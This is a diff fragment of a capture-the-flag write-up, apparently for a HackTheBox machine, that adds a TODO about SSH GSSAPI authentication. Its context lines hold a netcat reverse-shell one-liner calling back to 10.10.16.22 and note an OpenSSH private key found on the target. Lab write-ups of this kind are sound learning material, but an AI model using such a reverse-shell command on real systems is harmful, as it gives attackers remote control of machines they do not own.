@@ -91,3 +91,6 @@ cmd: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.22 13337 >/t
 ```
 7. In `/home/bindmgr` found `suport-case-XXXXXX` directory. There is an openssh private key in the `XXXXX-debuggin.script`, but not useful at this time.
 8. Found the hostname is `dynstr.dyna.htb`.
+
+#### TODO
+1. SSH GASSAPI Authentication
